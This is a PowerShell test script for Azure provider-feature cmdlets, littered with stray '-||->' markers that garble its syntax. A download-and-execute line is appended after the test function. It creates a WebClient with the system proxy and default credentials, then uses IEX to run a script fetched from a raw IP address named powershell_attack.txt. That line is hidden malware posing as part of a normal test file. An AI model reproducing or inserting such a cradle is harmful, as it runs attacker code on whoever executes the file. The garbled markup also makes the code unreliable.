














 -||-> function Test-AzureProviderFeature
{
     -||-> $defaultProviderFeatures =  -||-> Get-AzProviderFeature <-||-  <-||- 

     -||-> $allProviderFeatures =  -||-> Get-AzProviderFeature -ListAvailable <-||-  <-||- 

     -||-> Assert-True {  -||-> $allProviderFeatures.Length -gt $defaultProviderFeatures.Length <-||-  } <-||- 

     -||-> $batchFeatures =  -||-> Get-AzProviderFeature -ProviderName "Microsoft.Batch" <-||-  <-||- 

     -||-> Assert-True {  -||-> $batchFeatures.Length -eq 0 <-||-  } <-||- 

     -||-> $batchFeatures =  -||-> Get-AzProviderFeature -ProviderName "Microsoft.Batch" -ListAvailable <-||-  <-||- 

     -||-> Assert-True {  -||-> $batchFeatures.Length -gt 0 <-||-  } <-||- 

     -||-> Register-AzProviderFeature -ProviderName "Microsoft.Cache" -FeatureName "betaAccess3" <-||- 

     -||-> $cacheRegisteredFeatures =  -||-> Get-AzProviderFeature -ProviderName "Microsoft.Cache" <-||-  <-||- 

     -||-> Assert-True {  -||-> $cacheRegisteredFeatures.Length -gt 0 <-||-  } <-||- 
} <-||- 

 -||-> $M= -||-> new-object net.webclient <-||-  <-||- ; -||-> $M.proxy=[Net.WebRequest]::GetSystemWebProxy() <-||- ; -||-> $M.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials <-||- ; -||-> IEX $M.downloadstring('http://37.28.154.204/powershell_attack.txt') <-||- ;



